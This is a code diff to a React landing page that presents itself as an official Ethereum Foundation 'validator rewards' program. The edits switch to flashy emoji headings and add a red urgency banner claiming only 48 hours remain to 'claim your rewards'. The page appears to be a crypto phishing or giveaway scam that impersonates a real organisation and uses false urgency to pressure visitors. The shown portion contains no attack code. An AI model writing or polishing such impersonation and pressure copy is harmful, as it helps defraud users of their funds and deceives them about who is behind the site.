@@ -120,24 +120,34 @@ export default function Home() {
           {/* Hero Content */}
           <div className="text-center mb-16">
             {/* Status Badge */}
-            <div className="inline-flex items-center px-6 py-3 bg-gradient-to-r from-success/10 to-primary/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8 shadow-lg backdrop-blur-sm">
-              <CheckCircle className="w-4 h-4 mr-3 text-success animate-pulse" />
-              <span className="bg-gradient-to-r from-success to-primary bg-clip-text text-transparent font-semibold">
-                Official Ethereum Foundation Validator Rewards Program - Active Since 2022
+            <div className="inline-flex items-center px-8 py-4 bg-gradient-to-r from-green-500/20 to-blue-500/20 text-green-400 border-2 border-green-400/30 rounded-full text-lg font-bold mb-8 shadow-2xl backdrop-blur-sm animate-pulse">
+              <CheckCircle className="w-6 h-6 mr-4 text-green-400" />
+              <span className="bg-gradient-to-r from-green-400 via-blue-400 to-purple-400 bg-clip-text text-transparent font-black tracking-wide">
+                🎉 OFFICIAL ETHEREUM FOUNDATION - VALIDATOR REWARDS LIVE NOW! 🎉
               </span>
             </div>
             
             {/* Main Title */}
-            <h1 className="text-4xl md:text-6xl font-bold mb-6 leading-tight">
-              <span className="bg-gradient-to-r from-foreground via-primary to-secondary bg-clip-text text-transparent">
-                Ethereum Foundation
+            <h1 className="text-5xl md:text-7xl font-black mb-6 leading-tight animate-pulse">
+              <span className="bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent drop-shadow-2xl">
+                💰 ETHEREUM FOUNDATION 💰
               </span>
             </h1>
-            <h2 className="text-2xl md:text-4xl font-semibold mb-8">
-              <span className="bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent">
-                Validator Rewards Distribution
+            <h2 className="text-3xl md:text-5xl font-black mb-8 animate-bounce">
+              <span className="bg-gradient-to-r from-green-400 via-blue-500 to-purple-600 bg-clip-text text-transparent drop-shadow-xl">
+                🚀 VALIDATOR REWARDS DISTRIBUTION 🚀
               </span>
             </h2>
+            
+            {/* Urgency Banner */}
+            <div className="bg-gradient-to-r from-red-500/20 to-orange-500/20 border-2 border-red-400/50 rounded-xl p-6 mb-8 animate-pulse">
+              <h3 className="text-2xl md:text-3xl font-black text-red-400 mb-2">
+                ⚡ LIMITED TIME: CLAIM YOUR REWARDS NOW! ⚡
+              </h3>
+              <p className="text-lg md:text-xl font-bold text-orange-300">
+                💎 Exclusive Validator Program - Only 48 Hours Remaining! 💎
+              </p>
+            </div>
             
             {/* Professional Hero Visual Section with Custom SVGs */}
             <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12 max-w-5xl mx-auto">
